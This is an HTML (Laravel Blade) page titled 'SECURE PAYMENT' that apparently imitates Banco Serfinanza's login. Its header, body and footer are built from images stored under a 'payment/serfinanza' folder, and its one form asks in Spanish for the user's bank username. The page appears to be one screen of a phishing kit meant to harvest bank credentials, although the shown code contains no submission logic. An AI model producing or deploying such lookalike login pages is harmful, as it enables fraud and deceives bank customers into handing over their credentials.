<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">


    <title>SECURE PAYMENT</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">


    <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>

        <style>
            *{
                margin: 0;
                padding: 0;
            }
        </style>
</head>
<body>

<img src="{{asset('assets/img/payment/serfinanza/menu.jpg')}}" alt="" srcset="" width="100%">
    
<div class="user" style="width:90%; height:500px; border:1px solid #cdcdcd;margin:auto; margin-top:50px; border-radius:15px;">
<center><img src="{{asset('assets/img/payment/serfinanza/letras.jpg')}}" alt="" srcset="" width="80%">

<input type="text" name="" id="txtUsuario" placeholder="Ingresa tu usuario" style="width:80%; height:40px; padding-left:10px; border:1.5px solid #170c84;" minlength="4" maxlength="12" oninput="this.value = this.value.replace(/\s+/g, '')" required> 
<br>
<input type="submit" id="btnUsuario" value="Ingresar" style="height:40px; width:100px; margin-top:25px; background-color:#170c84; border-radius:25px; width:150px;">
<br><br>
<img src="{{asset('assets/img/payment/serfinanza/letras2.jpg')}}" alt="" srcset="" width="80%">
        </center>

</div>

<img src="{{asset('assets/img/payment/serfinanza/footer.jpg')}}" alt="" srcset="" width="100%">

</body>
</html>